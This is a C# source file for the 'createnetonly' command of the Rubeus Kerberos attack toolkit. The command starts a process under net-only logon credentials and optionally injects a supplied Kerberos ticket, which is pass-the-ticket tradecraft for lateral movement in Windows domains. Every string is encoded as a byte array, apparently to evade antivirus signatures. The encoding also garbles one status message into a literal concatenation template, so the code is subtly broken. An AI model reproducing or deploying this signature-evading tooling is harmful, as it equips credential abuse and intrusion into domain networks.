using System;
using System.Collections.Generic;
using System.IO;

namespace Rubeus.Commands
{
    public class Createnetonly : ICommand
    {
        private static string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);
        public static string CommandName => S(new byte[] { 99, 114, 101, 97, 116, 101, 110, 101, 116, 111, 110, 108, 121 });

        public void Execute(Dictionary<string, string> arguments)
        {
            string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);

            Console.WriteLine(S(new byte[] { 13, 10, 91, 42, 93, 32, 65, 99, 116, 105, 111, 110, 58, 32, 67, 114, 101, 97, 116, 101, 32, 78, 101, 116, 45, 79, 110, 108, 121, 32, 80, 114, 111, 99, 101, 115, 115, 13, 10 }));

            string program = null;
            string username = null;
            string password = null;
            string domain = null;
            byte[] kirbiBytes = null;
            bool show = arguments.ContainsKey(S(new byte[] { 47, 115, 104, 111, 119 }));

            if (arguments.ContainsKey(S(new byte[] { 47, 112, 114, 111, 103, 114, 97, 109 })) && !String.IsNullOrWhiteSpace(arguments[S(new byte[] { 47, 112, 114, 111, 103, 114, 97, 109 })]))
            {
                program = arguments[S(new byte[] { 47, 112, 114, 111, 103, 114, 97, 109 })];
            }
            else
            {
                Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 65, 32, 47, 112, 114, 111, 103, 114, 97, 109, 32, 110, 101, 101, 100, 115, 32, 116, 111, 32, 98, 101, 32, 115, 117, 112, 112, 108, 105, 101, 100, 33, 13, 10 }));
                return;
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 117, 115, 101, 114, 110, 97, 109, 101 })))
            {
                username = arguments[S(new byte[] { 47, 117, 115, 101, 114, 110, 97, 109, 101 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 112, 97, 115, 115, 119, 111, 114, 100 })))
            {
                password = arguments[S(new byte[] { 47, 112, 97, 115, 115, 119, 111, 114, 100 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 100, 111, 109, 97, 105, 110 })))
            {
                domain = arguments[S(new byte[] { 47, 100, 111, 109, 97, 105, 110 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 116, 105, 99, 107, 101, 116 })))
            {
                string kirbi64 = arguments[S(new byte[] { 47, 116, 105, 99, 107, 101, 116 })];

                if (Helpers.IsBase64String(kirbi64))
                {
                    kirbiBytes = Convert.FromBase64String(kirbi64);
                }
                else if (File.Exists(kirbi64))
                {
                    kirbiBytes = File.ReadAllBytes(kirbi64);
                }
                else
                {
                    Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 47, 116, 105, 99, 107, 101, 116, 58, 88, 32, 109, 117, 115, 116, 32, 101, 105, 116, 104, 101, 114, 32, 98, 101, 32, 97, 32, 46, 107, 105, 114, 98, 105, 32, 102, 105, 108, 101, 32, 111, 114, 32, 97, 32, 98, 97, 115, 101, 54, 52, 32, 101, 110, 99, 111, 100, 101, 100, 32, 46, 107, 105, 114, 98, 105, 13, 10 }));
                    return;
                }
            }

            if (username == null && password == null && domain == null)
            {
                Console.WriteLine(S(new byte[] { 13, 10, 91, 42, 93, 32, 85, 115, 105, 110, 103, 32, 114, 97, 110, 100, 111, 109, 32, 117, 115, 101, 114, 110, 97, 109, 101, 32, 97, 110, 100, 32, 112, 97, 115, 115, 119, 111, 114, 100, 46, 13, 10 }));
                Helpers.CreateProcessNetOnly(program, show, username, domain, password, kirbiBytes);
                return;
            }

            if (!String.IsNullOrWhiteSpace(username) && !String.IsNullOrWhiteSpace(password) && !String.IsNullOrWhiteSpace(domain))
            {
                Console.WriteLine(S(new byte[] { 13, 10, 91, 42, 93, 32, 85, 115, 105, 110, 103, 32, 34, 43, 100, 111, 109, 97, 105, 110, 43, 34, 92, 34, 43, 117, 115, 101, 114, 110, 97, 109, 101, 43, 34, 58, 34, 43, 112, 97, 115, 115, 119, 111, 114, 100, 43, 34, 13, 10 }));
                Helpers.CreateProcessNetOnly(program, show, username, domain, password, kirbiBytes);
                return;
            }

            Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 69, 120, 112, 108, 105, 99, 105, 116, 32, 99, 114, 101, 100, 115, 32, 114, 101, 113, 117, 105, 114, 101, 32, 47, 117, 115, 101, 114, 110, 97, 109, 101, 44, 32, 47, 112, 97, 115, 115, 119, 111, 114, 100, 44, 32, 97, 110, 100, 32, 47, 100, 111, 109, 97, 105, 110, 32, 116, 111, 32, 98, 101, 32, 115, 117, 112, 112, 108, 105, 101, 100, 33, 13, 10 }));
        }
    }
}
